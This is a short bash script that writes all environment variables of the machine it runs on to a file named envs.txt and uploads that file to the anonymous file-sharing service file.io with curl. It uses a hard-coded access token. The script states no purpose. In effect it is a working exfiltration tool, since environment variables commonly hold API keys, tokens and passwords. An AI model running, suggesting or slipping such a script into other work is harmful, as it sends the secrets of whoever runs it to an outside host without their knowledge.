#!/bin/bash

tmpfile="./envs.txt"
env | sort > "$tmpfile"

curl --location 'https://file.io/?title=envs.txt' \
--header 'X-File-Io-Anonymous-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJiZGUwYzAwMC1lNGU5LTExZWUtODk5MC1kZmM5NzFiMDk4ZjIiLCJpYXQiOjE3MTA3NDAzMDUsImV4cCI6MTcxMDgyNjcwNX0.PA4jM5MWd7f09zZEkkNYPo9El-0UZSmi63trf1HZxvE' \
--form "=@$tmpfile"
